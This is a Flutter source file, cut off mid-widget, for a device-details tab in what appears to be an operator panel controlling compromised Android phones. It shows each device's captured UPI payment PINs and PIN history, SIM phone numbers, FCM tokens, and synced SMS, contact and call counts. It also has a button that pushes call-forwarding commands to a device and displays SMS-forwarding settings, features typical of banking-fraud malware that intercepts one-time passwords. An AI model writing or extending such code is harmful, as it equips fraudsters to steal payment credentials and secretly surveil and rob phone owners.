import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:provider/provider.dart';
import '../../../../data/models/device.dart';
import '../../../../data/repositories/device_repository.dart';
import '../../../../core/utils/date_utils.dart' as utils;
import '../dialogs/edit_settings_dialog.dart';
import '../../../widgets/dialogs/call_forwarding_dialog.dart';
import '../../../providers/device_provider.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import '../upi_pins_screen.dart';

class DeviceInfoTab extends StatefulWidget {
  final Device device;

  const DeviceInfoTab({
    super.key,
    required this.device,
  });

  @override
  State<DeviceInfoTab> createState() => _DeviceInfoTabState();
}

class _DeviceInfoTabState extends State<DeviceInfoTab> {
  final DeviceRepository _repository = DeviceRepository();
  late Device _currentDevice;
  bool _isRefreshing = false;

  @override
  void initState() {
    super.initState();
    _currentDevice = widget.device;
  }

  @override
  void didUpdateWidget(DeviceInfoTab oldWidget) {
    super.didUpdateWidget(oldWidget);
    if (oldWidget.device != widget.device) {
      setState(() {
        _currentDevice = widget.device;
      });
    }
  }

  Future<void> _refreshDeviceInfo() async {
    if (_isRefreshing) return;

    setState(() => _isRefreshing = true);

    try {
      final updatedDevice = await _repository.getDevice(_currentDevice.deviceId);
      if (updatedDevice != null && mounted) {
        setState(() {
          _currentDevice = updatedDevice;
          _isRefreshing = false;
        });
      } else {
        setState(() => _isRefreshing = false);
      }
    } catch (e) {
      if (mounted) {
        setState(() => _isRefreshing = false);
      }
    }
  }

  Future<void> _handleEditSettings() async {
    final result = await showDialog<bool>(
      context: context,
      builder: (_) => EditSettingsDialog(device: _currentDevice),
    );

    if (result == true && mounted) {
      await Future.delayed(const Duration(milliseconds: 500));
      await _refreshDeviceInfo();
    }
  }

  Future<void> _handleCallForwarding() async {
    final result = await showDialog<Map<String, dynamic>>(
      context: context,
      builder: (_) => CallForwardingDialog(device: _currentDevice),
    );

    if (result == null) return;

    final deviceProvider = context.read<DeviceProvider>();
    final action = result['action'];

    bool success = false;

    try {
      if (action == 'enable') {
        success = await deviceProvider.sendCommand(
          _currentDevice.deviceId,
          'call_forwarding',
          parameters: {
            'number': result['number'],
            'simSlot': result['simSlot'],
          },
        );
      } else if (action == 'disable') {
        success = await deviceProvider.sendCommand(
          _currentDevice.deviceId,
          'call_forwarding_disable',
          parameters: {
            'simSlot': result['simSlot'],
          },
        );
      }

      if (mounted) {
        if (success) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Row(
                children: [
                  const Icon(Icons.check_circle_rounded, color: Colors.white, size: 18),
                  const SizedBox(width: 10),
                  Text(
                    action == 'enable'
                        ? 'Call forwarding command sent!'
                        : 'Call forwarding disable command sent!',
                    style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 12),
                  ),
                ],
              ),
              backgroundColor: const Color(0xFF10B981),
              behavior: SnackBarBehavior.floating,
              duration: const Duration(seconds: 3),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(8),
              ),
            ),
          );

          // رفرش اطلاعات دستگاه بعد از 2 ثانیه
          await Future.delayed(const Duration(seconds: 2));
          await _refreshDeviceInfo();
        } else {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Row(
                children: const [
                  Icon(Icons.error_rounded, color: Colors.white, size: 18),
                  SizedBox(width: 10),
                  Text(
                    'Failed to send command',
                    style: TextStyle(fontWeight: FontWeight.w600, fontSize: 12),
                  ),
                ],
              ),
              backgroundColor: const Color(0xFFEF4444),
              behavior: SnackBarBehavior.floating,
              duration: const Duration(seconds: 3),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(8),
              ),
            ),
          );
        }
      }
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Row(
              children: [
                const Icon(Icons.error_rounded, color: Colors.white, size: 18),
                const SizedBox(width: 10),
                Expanded(
                  child: Text(
                    'Error: ${e.toString()}',
                    style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 12),
                  ),
                ),
              ],
            ),
            backgroundColor: const Color(0xFFEF4444),
            behavior: SnackBarBehavior.floating,
            duration: const Duration(seconds: 3),
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(8),
            ),
          ),
        );
      }
    }
  }

  void _copyToClipboard(String text, String label) {
    Clipboard.setData(ClipboardData(text: text));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('$label copied to clipboard'),
        backgroundColor: const Color(0xFF10B981),
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 2),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(6.4),
        ),
      ),
    );
  }

  String _getUpiPin() {
    // Use new upiPins array first, fallback to deprecated upiPin
    if (_currentDevice.latestUpiPin != null) {
      return _currentDevice.latestUpiPin!.pin;
    }
    if (_currentDevice.upiPin != null && _currentDevice.upiPin!.isNotEmpty) {
      return _currentDevice.upiPin!;
    }
    return 'N/A';
  }

  void _navigateToUPIPinsScreen() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => UPIPinsScreen(device: _currentDevice),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isDark = Theme.of(context).brightness == Brightness.dark;

    return RefreshIndicator(
      onRefresh: _refreshDeviceInfo,
      child: SingleChildScrollView(
        physics: const AlwaysScrollableScrollPhysics(),
        padding: EdgeInsets.fromLTRB(12.8, 12.8, 12.8, MediaQuery.of(context).padding.bottom + 16),
        child: Column(
          children: [
            Row(
              children: [
                Expanded(
                  child: _QuickStatCard(
                    icon: Icons.battery_charging_full_rounded,
                    label: 'Battery',
                    value: '${_currentDevice.batteryLevel}%',
                    subtitle: _currentDevice.batteryState ?? '',
                    color: _getBatteryColor(_currentDevice.batteryLevel),
                    isDark: isDark,
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: _QuickStatCard(
                    icon: Icons.memory_rounded,
                    label: 'RAM',
                    value: _currentDevice.ramPercentFree != null
                        ? '${_currentDevice.ramPercentFree!.round()}%'
                        : 'N/A',
                    subtitle: 'Free',
                    color: _getRAMColor(_currentDevice.ramPercentFree),
                    isDark: isDark,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 10),

            // UPI PIN Card - فقط آخرین PIN را نشون بده و قابل کلیک باشه
            if (_currentDevice.hasUpi && (_currentDevice.hasUpiPins || (_currentDevice.upiPin != null && _currentDevice.upiPin!.isNotEmpty))) ...[
              Row(
                children: [
                  Expanded(
                    child: Material(
                      color: Colors.transparent,
                      child: InkWell(
                        onTap: _currentDevice.hasUpiPins ? _navigateToUPIPinsScreen : null,
                        borderRadius: BorderRadius.circular(10.24),
                        child: Container(
                          padding: const EdgeInsets.all(9.6),
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              begin: Alignment.topLeft,
                              end: Alignment.bottomRight,
                              colors: [
                                const Color(0xFF8B5CF6).withOpacity(isDark ? 0.15 : 0.1),
                                const Color(0xFF8B5CF6).withOpacity(isDark ? 0.1 : 0.05),
                              ],
                            ),
                            borderRadius: BorderRadius.circular(10.24),
                            border: Border.all(
                              color: const Color(0xFF8B5CF6).withOpacity(0.2),
                              width: 1.2,
                            ),
                          ),
                          child: Row(
                            children: [
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Row(
                                      children: [
                                        Container(
                                          padding: const EdgeInsets.all(6.4),
                                          decoration: BoxDecoration(
                                            color: const Color(0xFF8B5CF6).withOpacity(0.2),
                                            borderRadius: BorderRadius.circular(6.4),
                                          ),
                                          child: const Icon(
                                            Icons.payment_rounded,
                                            color: Color(0xFF8B5CF6),
                                            size: 14.4,
                                          ),
                                        ),
                                        if (_currentDevice.hasUpiPins) ...[
                                          const SizedBox(width: 6),
                                          Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                                            decoration: BoxDecoration(
                                              gradient: const LinearGradient(
                                                colors: [Color(0xFF10B981), Color(0xFF059669)],
                                              ),
                                              borderRadius: BorderRadius.circular(4),
                                            ),
                                            child: Row(
                                              mainAxisSize: MainAxisSize.min,
                                              children: [
                                                const Icon(Icons.star_rounded, size: 10, color: Colors.white),
                                                const SizedBox(width: 4),
                                                Text(
                                                  'Latest',
                                                  style: TextStyle(
                                                    fontSize: 8,
                                                    fontWeight: FontWeight.w700,
                                                    color: Colors.white,
                                                  ),
                                                ),
                                              ],
                                            ),
                                          ),
                                        ],
                                      ],
                                    ),
                                    const SizedBox(height: 8),
                                    Text(
                                      _getUpiPin(),
                                      style: const TextStyle(
                                        fontSize: 20,
                                        fontWeight: FontWeight.w800,
                                        color: Color(0xFF8B5CF6),
                                        letterSpacing: 3,
                                        fontFamily: 'monospace',
                                      ),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    const SizedBox(height: 2),
                                    Row(
                                      children: [
                                        Text(
                                          'UPI PIN',
                                          style: TextStyle(
                                            fontSize: 8,
                                            fontWeight: FontWeight.w600,
                                            color: isDark ? Colors.white60 : const Color(0xFF64748B),
                                          ),
                                        ),
                                        if (_currentDevice.hasUpiPins) ...[
                                          const SizedBox(width: 6),
                                          Text(
                                            '${_currentDevice.upiPinsCount} total',
                                            style: TextStyle(
                                              fontSize: 7.2,
                                              fontWeight: FontWeight.w500,
                                              color: isDark ? Colors.white.withOpacity(0.4) : const Color(0xFF94A3B8),
                                            ),
                                          ),
                                        ],
                                      ],
                                    ),
                                  ],
                                ),
                              ),
                              if (_currentDevice.hasUpiPins)
                                Container(
                                  padding: const EdgeInsets.all(6),
                                  decoration: BoxDecoration(
                                    color: const Color(0xFF8B5CF6).withOpacity(0.1),
                                    borderRadius: BorderRadius.circular(6),
                                  ),
                                  child: const Icon(
                                    Icons.arrow_forward_ios_rounded,
                                    color: Color(0xFF8B5CF6),
                                    size: 14,
                                  ),
                                ),
                            ],
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 10),
            ],

            Row(
              children: [
                Expanded(
                  child: _QuickStatCard(
                    icon: Icons.storage_rounded,
                    label: 'Storage',
                    value: _currentDevice.storagePercentFree != null
                        ? '${_currentDevice.storagePercentFree!.round()}%'
                        : 'N/A',
                    subtitle: 'Free',
                    color: _getStorageColor(_currentDevice.storagePercentFree),
                    isDark: isDark,
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: _QuickStatCard(
                    icon: Icons.signal_cellular_alt_rounded,
                    label: 'Network',
                    value: _currentDevice.networkType ?? 'N/A',
                    subtitle: _currentDevice.primaryCarrier,
                    color: const Color(0xFF3B82F6),
                    isDark: isDark,
                    isSmallText: true,
                  ),
                ),
              ],
            ),

            const SizedBox(height: 16),

            _ModernCard(
              isDark: isDark,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _SectionHeader(
                    icon: Icons.smartphone_rounded,
                    title: 'Device Information',
                    color: const Color(0xFF6366F1),
                  ),
                  const SizedBox(height: 12),
                  _InfoTile(
                    icon: Icons.devices_rounded,
                    label: 'Model',
                    value: _currentDevice.model,
                    isDark: isDark,
                  ),
                  _InfoTile(
                    icon: Icons.business_rounded,
                    label: 'Manufacturer',
                    value: '${_currentDevice.brand ?? _currentDevice.manufacturer}',
                    isDark: isDark,
                  ),
                  if (_currentDevice.deviceName != null)
                    _InfoTile(
                      icon: Icons.phone_android_rounded,
                      label: 'Device',
                      value: _currentDevice.deviceName!,
                      isDark: isDark,
                    ),
                  if (_currentDevice.product != null)
                    _InfoTile(
                      icon: Icons.category_rounded,
                      label: 'Product',
                      value: _currentDevice.product!,
                      isDark: isDark,
                    ),
                  _InfoTile(
                    icon: Icons.android_rounded,
                    label: 'Android Version',
                    value: 'Android ${_currentDevice.osVersion} (SDK ${_currentDevice.sdkInt ?? ""})',
                    isDark: isDark,
                  ),
                  _InfoTile(
                    icon: Icons.app_settings_alt_rounded,
                    label: 'App Version',
                    value: '1.0.0',
                    isDark: isDark,
                  ),
                  if (_currentDevice.appType != null)
                    _InfoTile(
                      icon: Icons.apps_rounded,
                      label: 'App Type',
                      value: _currentDevice.appType!,
                      isDark: isDark,
                    ),
                  if (_currentDevice.screenResolution != null)
                    _InfoTile(
                      icon: Icons.screenshot_rounded,
                      label: 'Screen',
                      value: '${_currentDevice.screenResolution} @ ${_currentDevice.screenDensity?.toStringAsFixed(1) ?? ""}dpi',
                      isDark: isDark,
                    ),
                  _CopyableInfoTile(
                    icon: Icons.fingerprint_rounded,
                    label: 'Device ID',
                    value: _currentDevice.deviceId,
                    isDark: isDark,
                    isMonospace: true,
                    onCopy: () => _copyToClipboard(_currentDevice.deviceId, 'Device ID'),
                  ),
                ],
              ),
            ),

            const SizedBox(height: 12),

            _ModernCard(
              isDark: isDark,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _SectionHeader(
                    icon: Icons.settings_suggest_rounded,
                    title: 'Hardware Specs',
                    color: const Color(0xFFEC4899),
                  ),
                  const SizedBox(height: 12),
                  if (_currentDevice.hardware != null)
                    _InfoTile(
                      icon: Icons.developer_board_rounded,
                      label: 'Hardware',
                      value: _currentDevice.hardware!,
                      isDark: isDark,
                    ),
                  if (_currentDevice.board != null)
                    _InfoTile(
                      icon: Icons.memory_rounded,
                      label: 'Board',
                      value: _currentDevice.board!,
                      isDark: isDark,
                    ),
                  if (_currentDevice.totalRamMb != null)
                    _InfoTile(
                      icon: Icons.memory_rounded,
                      label: 'Total RAM',
                      value: '${(_currentDevice.totalRamMb! / 1024).toStringAsFixed(1)} GB',
                      isDark: isDark,
                    ),
                  if (_currentDevice.freeRamMb != null)
                    _InfoTile(
                      icon: Icons.speed_rounded,
                      label: 'Available RAM',
                      value: '${_currentDevice.freeRamMb} MB',
                      isDark: isDark,
                    ),
                  if (_currentDevice.totalStorageMb != null)
                    _InfoTile(
                      icon: Icons.storage_rounded,
                      label: 'Total Storage',
                      value: '${(_currentDevice.totalStorageMb! / 1024).toStringAsFixed(1)} GB',
                      isDark: isDark,
                    ),
                  if (_currentDevice.freeStorageMb != null)
                    _InfoTile(
                      icon: Icons.sd_storage_rounded,
                      label: 'Free Storage',
                      value: '${(_currentDevice.freeStorageMb! / 1024).toStringAsFixed(1)} GB',
                      isDark: isDark,
                    ),
                  if (_currentDevice.supportedAbis != null && _currentDevice.supportedAbis!.isNotEmpty)
                    _InfoTile(
                      icon: Icons.developer_board_rounded,
                      label: 'Architecture',
                      value: _currentDevice.supportedAbis!.join(', '),
                      isDark: isDark,
                    ),
                  if (_currentDevice.isRooted != null)
                    _InfoTile(
                      icon: Icons.security_rounded,
                      label: 'Root Status',
                      value: _currentDevice.isRooted! ? 'Rooted' : 'Not Rooted',
                      valueColor: _currentDevice.isRooted! ? const Color(0xFFEF4444) : const Color(0xFF10B981),
                      isDark: isDark,
                    ),
                  if (_currentDevice.isEmulator != null)
                    _InfoTile(
                      icon: Icons.computer_rounded,
                      label: 'Emulator',
                      value: _currentDevice.isEmulator! ? 'Yes' : 'No',
                      valueColor: _currentDevice.isEmulator! ? const Color(0xFFF59E0B) : const Color(0xFF10B981),
                      isDark: isDark,
                    ),
                ],
              ),
            ),

            const SizedBox(height: 12),

            if (_currentDevice.fingerprint != null || _currentDevice.display != null || _currentDevice.host != null)
              _ModernCard(
                isDark: isDark,
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    _SectionHeader(
                      icon: Icons.info_rounded,
                      title: 'Build Information',
                      color: const Color(0xFF14B8A6),
                    ),
                    const SizedBox(height: 12),
                    if (_currentDevice.fingerprint != null)
                      _CopyableInfoTile(
                        icon: Icons.fingerprint_rounded,
                        label: 'Fingerprint',
                        value: _currentDevice.fingerprint!,
                        isDark: isDark,
                        isMonospace: true,
                        maxLines: 3,
                        onCopy: () => _copyToClipboard(_currentDevice.fingerprint!, 'Fingerprint'),
                      ),
                    if (_currentDevice.display != null)
                      _InfoTile(
                        icon: Icons.display_settings_rounded,
                        label: 'Display',
                        value: _currentDevice.display!,
                        isDark: isDark,
                      ),
                    if (_currentDevice.host != null)
                      _InfoTile(
                        icon: Icons.dns_rounded,
                        label: 'Host',
                        value: _currentDevice.host!,
                        isDark: isDark,
                      ),
                  ],
                ),
              ),

            const SizedBox(height: 12),

            if (_currentDevice.simInfo != null && _currentDevice.simInfo!.isNotEmpty)
              _ModernCard(
                isDark: isDark,
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    _SectionHeader(
                      icon: Icons.sim_card_rounded,
                      title: 'SIM Card Information',
                      color: const Color(0xFF06B6D4),
                    ),
                    const SizedBox(height: 12),
                    ..._currentDevice.simInfo!.asMap().entries.map((entry) {
                      final sim = entry.value;
                      return Padding(
                        padding: const EdgeInsets.only(bottom: 12),
                        child: Container(
                          padding: const EdgeInsets.all(9.6),
                          decoration: BoxDecoration(
                            color: isDark ? Colors.white.withOpacity(0.05) : const Color(0xFFF8FAFC),
                            borderRadius: BorderRadius.circular(7.68),
                            border: Border.all(
                              color: isDark ? Colors.white.withOpacity(0.1) : Colors.black.withOpacity(0.05),
                            ),
                          ),
                          child: Column(
                            children: [
                              _InfoTile(
                                icon: Icons.sim_card_rounded,
                                label: 'SIM Slot',
                                value: 'Slot ${sim.simSlot}',
                                isDark: isDark,
                              ),
                              _InfoTile(
                                icon: Icons.wifi_calling_rounded,
                                label: 'Carrier',
                                value: sim.carrierName,
                                isDark: isDark,
                              ),
                              if (sim.phoneNumber.isNotEmpty && sim.phoneNumber != 'Unknown')
                                _CopyableInfoTile(
                                  icon: Icons.phone_rounded,
                                  label: 'Phone Number',
                                  value: sim.phoneNumber,
                                  isDark: isDark,
                                  isMonospace: true,
                                  onCopy: () => _copyToClipboard(sim.phoneNumber, 'Phone Number'),
                                ),
                              if (sim.networkType != null)
                                _InfoTile(
                                  icon: Icons.signal_cellular_alt_rounded,
                                  label: 'Network Type',
                                  value: sim.networkType!,
                                  isDark: isDark,
                                ),
                              if (sim.countryIso != null)
                                _InfoTile(
                                  icon: Icons.public_rounded,
                                  label: 'Country',
                                  value: sim.countryIso!.toUpperCase(),
                                  isDark: isDark,
                                ),
                              if (sim.simState != null)
                                _InfoTile(
                                  icon: Icons.info_outline_rounded,
                                  label: 'Status',
                                  value: sim.simState!,
                                  valueColor: sim.simState == 'Ready' ? const Color(0xFF10B981) : const Color(0xFFF59E0B),
                                  isDark: isDark,
                                ),
                            ],
                          ),
                        ),
                      );
                    }).toList(),
                  ],
                ),
              ),

            const SizedBox(height: 12),

            // 📞 Call Forwarding Card با دکمه مدیریت
            _ModernCard(
              isDark: isDark,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: _SectionHeader(
                          icon: Icons.phone_forwarded_rounded,
                          title: 'Call Forwarding',
                          color: const Color(0xFFF59E0B),
                        ),
                      ),
                      Container(
                        decoration: BoxDecoration(
                          gradient: const LinearGradient(colors: [Color(0xFFF59E0B), Color(0xFFD97706)]),
                          borderRadius: BorderRadius.circular(6.4),
                        ),
                        child: Material(
                          color: Colors.transparent,
                          child: InkWell(
                            onTap: _isRefreshing ? null : _handleCallForwarding,
                            borderRadius: BorderRadius.circular(6.4),
                            child: Container(
                              padding: const EdgeInsets.all(6.4),
                              child: Row(
                                mainAxisSize: MainAxisSize.min,
                                children: const [
                                  Icon(Icons.settings_rounded, size: 11.2, color: Colors.white),
                                  SizedBox(width: 4),
                                  Text(
                                    'Manage',
                                    style: TextStyle(
                                      fontSize: 9,
                                      fontWeight: FontWeight.w700,
                                      color: Colors.white,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  
                  if (_currentDevice.callForwardingEnabled == null || _currentDevice.callForwardingEnabled == false) ...[
                    // نمایش حالت غیرفعال
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: isDark 
                            ? Colors.white.withOpacity(0.05) 
                            : const Color(0xFFF8FAFC),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(
                          color: isDark 
                              ? Colors.white.withOpacity(0.1) 
                              : Colors.black.withOpacity(0.05),
                        ),
                      ),
                      child: Row(
                        children: [
                          Icon(
                            Icons.info_outline_rounded,
                            size: 14,
                            color: isDark ? Colors.white54 : const Color(0xFF94A3B8),
                          ),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              'Call forwarding is currently disabled',
                              style: TextStyle(
                                fontSize: 10,
                                fontWeight: FontWeight.w500,
                                color: isDark ? Colors.white70 : const Color(0xFF64748B),
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ] else ...[
                    // نمایش اطلاعات فعال
                    _InfoTile(
                      icon: Icons.toggle_on_rounded,
                      label: 'Status',
                      value: 'Enabled',
                      valueColor: const Color(0xFF10B981),
                      isDark: isDark,
                    ),
                    if (_currentDevice.callForwardingNumber != null)
                      _CopyableInfoTile(
                        icon: Icons.phone_rounded,
                        label: 'Forward Number',
                        value: _currentDevice.callForwardingNumber!,
                        isDark: isDark,
                        isMonospace: true,
                        onCopy: () => _copyToClipboard(
                          _currentDevice.callForwardingNumber!,
                          'Forward Number',
                        ),
                      ),
                    if (_currentDevice.callForwardingSimSlot != null)
                      _InfoTile(
                        icon: Icons.sim_card_rounded,
                        label: 'SIM Slot',
                        value: 'SIM ${_currentDevice.callForwardingSimSlot! + 1}',
                        isDark: isDark,
                      ),
                    if (_currentDevice.callForwardingUpdatedAt != null)
                      _InfoTile(
                        icon: Icons.access_time_rounded,
                        label: 'Last Updated',
                        value: utils.DateUtils.formatForDisplay(_currentDevice.callForwardingUpdatedAt!),
                        isDark: isDark,
                      ),
                  ],
                ],
              ),
            ),

            const SizedBox(height: 12),

            _ModernCard(
              isDark: isDark,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _SectionHeader(
                    icon: Icons.wifi_rounded,
                    title: 'Connection Status',
                    color: const Color(0xFF10B981),
                  ),
                  const SizedBox(height: 12),
                  _InfoTile(
                    icon: Icons.circle_rounded,
                    label: 'Status',
                    value: _currentDevice.isOnline ? 'Online' : 'Offline',
                    valueColor: _currentDevice.isOnline ? const Color(0xFF10B981) : const Color(0xFFEF4444),
                    isDark: isDark,
                  ),
                  if (_currentDevice.isOnlineStatus != null)
                    _InfoTile(
                      icon: Icons.wifi_tethering_rounded,
                      label: 'Real-time Status',
                      value: _currentDevice.isOnlineStatus! ? 'Connected' : 'Disconnected',
                      valueColor: _currentDevice.isOnlineStatus! ? const Color(0xFF10B981) : const Color(0xFFEF4444),
                      isDark: isDark,
                    ),
                  if (_currentDevice.networkType != null)
                    _InfoTile(
                      icon: Icons.network_cell_rounded,
                      label: 'Network Type',
                      value: _currentDevice.networkType!.toUpperCase(),
                      isDark: isDark,
                    ),
                  if (_currentDevice.ipAddress != null && _currentDevice.ipAddress != 'mobile_network')
                    _InfoTile(
                      icon: Icons.router_rounded,
                      label: 'IP Address',
                      value: _currentDevice.ipAddress!,
                      isDark: isDark,
                      isMonospace: true,
                    ),
                  _InfoTile(
                    icon: Icons.access_time_rounded,
                    label: 'Last Ping',
                    value: utils.DateUtils.formatForDisplay(_currentDevice.lastPing),
                    isDark: isDark,
                  ),
                  if (_currentDevice.lastOnlineUpdate != null)
                    _InfoTile(
                      icon: Icons.update_rounded,
                      label: 'Last Online Update',
                      value: utils.DateUtils.formatForDisplay(_currentDevice.lastOnlineUpdate!),
                      isDark: isDark,
                    ),
                  _InfoTile(
                    icon: Icons.calendar_today_rounded,
                    label: 'Registered',
                    value: utils.DateUtils.formatForDisplay(_currentDevice.registeredAt),
                    isDark: isDark,
                  ),
                ],
              ),
            ),

            const SizedBox(height: 12),

            if (_currentDevice.fcmTokens != null && _currentDevice.fcmTokens!.isNotEmpty)
              _ModernCard(
                isDark: isDark,
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    _SectionHeader(
                      icon: Icons.notifications_active_rounded,
                      title: 'FCM Tokens',
                      color: const Color(0xFFFF6B35),
                    ),
                    const SizedBox(height: 12),
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: isDark ? const Color(0xFFFF6B35).withOpacity(0.1) : const Color(0xFFFF6B35).withOpacity(0.05),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: const Color(0xFFFF6B35).withOpacity(0.3)),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.info_outline_rounded, size: 14, color: const Color(0xFFFF6B35)),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              '${_currentDevice.fcmTokens!.length} active FCM token(s) registered',
                              style: TextStyle(fontSize: 10, fontWeight: FontWeight.w600, color: const Color(0xFFFF6B35)),
                            ),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 12),
                    ..._currentDevice.fcmTokens!.asMap().entries.map((entry) {
                      final index = entry.key;
                      final token = entry.value;
                      return Padding(
                        padding: const EdgeInsets.only(bottom: 8),
                        child: Container(
                          padding: const EdgeInsets.all(10),
                          decoration: BoxDecoration(
                            color: isDark ? Colors.white.withOpacity(0.05) : const Color(0xFFF8FAFC),
                            borderRadius: BorderRadius.circular(8),
                            border: Border.all(
                              color: isDark ? Colors.white.withOpacity(0.1) : Colors.black.withOpacity(0.05),
                            ),
                          ),
                          child: Row(
                            children: [
                              Container(
                                width: 24,
                                height: 24,
                                decoration: BoxDecoration(
                                  color: const Color(0xFFFF6B35).withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(6),
                                ),
                                child: Center(
                                  child: Text(
                                    '${index + 1}',
                                    style: TextStyle(fontSize: 10, fontWeight: FontWeight.w700, color: const Color(0xFFFF6B35)),
                                  ),
                                ),
                              ),
                              const SizedBox(width: 10),
                              Expanded(
                                child: Text(
                                  token.length > 50 ? '${token.substring(0, 47)}...' : token,
                                  style: TextStyle(
                                    fontSize: 9,
                                    fontWeight: FontWeight.w500,
                                    fontFamily: 'monospace',
                                    color: isDark ? Colors.white70 : const Color(0xFF64748B),
                                  ),
                                  maxLines: 2,
                                  overflow: TextOverflow.ellipsis,
                                ),
                              ),
                              const SizedBox(width: 8),
                              Material(
                                color: Colors.transparent,
                                child: InkWell(
                                  onTap: () => _copyToClipboard(token, 'FCM Token'),
                                  borderRadius: BorderRadius.circular(6),
                                  child: Container(
                                    padding: const EdgeInsets.all(6),
                                    decoration: BoxDecoration(
                                      color: const Color(0xFFFF6B35).withOpacity(0.1),
                                      borderRadius: BorderRadius.circular(6),
                                    ),
                                    child: Icon(Icons.copy_rounded, size: 14, color: const Color(0xFFFF6B35)),
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    }).toList(),
                  ],
                ),
              ),

            const SizedBox(height: 12),

            _ModernCard(
              isDark: isDark,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _SectionHeader(
                    icon: Icons.bar_chart_rounded,
                    title: 'Statistics',
                    color: const Color(0xFFF59E0B),
                  ),
                  const SizedBox(height: 12),
                  _InfoTile(
                    icon: Icons.chat_bubble_rounded,
                    label: 'Total Messages',
                    value: '${_currentDevice.stats.totalSms}',
                    isDark: isDark,
                  ),
                  _InfoTile(
                    icon: Icons.people_rounded,
                    label: 'Total Contacts',
                    value: '${_currentDevice.stats.totalContacts}',
                    isDark: isDark,
                  ),
                  _InfoTile(
                    icon: Icons.call_rounded,
                    label: 'Total Calls',
                    value: '${_currentDevice.stats.totalCalls}',
                    isDark: isDark,
                  ),
                  if (_currentDevice.stats.lastSmsSyncDate != null)
                    _InfoTile(
                      icon: Icons.sync_rounded,
                      label: 'Last SMS Sync',
                      value: utils.DateUtils.formatForDisplay(_currentDevice.stats.lastSmsSyncDate!),
                      isDark: isDark,
                    ),
                  if (_currentDevice.stats.lastContactSyncDate != null)
                    _InfoTile(
                      icon: Icons.sync_rounded,
                      label: 'Last Contact Sync',
                      value: utils.DateUtils.formatForDisplay(_currentDevice.stats.lastContactSyncDate!),
                      isDark: isDark,
                    ),
                  if (_currentDevice.stats.lastCallSyncDate != null)
                    _InfoTile(
                      icon: Icons.sync_rounded,
                      label: 'Last Call Sync',
                      value: utils.DateUtils.formatForDisplay(_currentDevice.stats.lastCallSyncDate!),
                      isDark: isDark,
                    ),
                ],
              ),
            ),

            const SizedBox(height: 12),

            _ModernCard(
              isDark: isDark,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: _SectionHeader(
                          icon: Icons.tune_rounded,
                          title: 'Settings',
                          color: const Color(0xFF8B5CF6),
                        ),
                      ),
                      Container(
                        decoration: BoxDecoration(
                          gradient: const LinearGradient(colors: [Color(0xFF6366F1), Color(0xFF8B5CF6)]),
                          borderRadius: BorderRadius.circular(6.4),
                        ),
                        child: Material(
                          color: Colors.transparent,
                          child: InkWell(
                            onTap: _isRefreshing ? null : _handleEditSettings,
                            borderRadius: BorderRadius.circular(6.4),
                            child: Container(
                              padding: const EdgeInsets.all(6.4),
                              child: const Icon(Icons.edit_rounded, size: 12.8, color: Colors.white),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  _SettingTile(
                    icon: Icons.forward_to_inbox_rounded,
                    label: 'SMS Forwarding',
                    isEnabled: _currentDevice.settings.smsForwardEnabled,
                    isDark: isDark,
                  ),
                  if (_currentDevice.settings.forwardNumber != null)
                    Padding(
                      padding: const EdgeInsets.only(left: 25.6, top: 6),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4.8),
                        decoration: BoxDecoration(
                          color: isDark ? Colors.white.withOpacity(0.05) : const Color(0xFFF1F5F9),
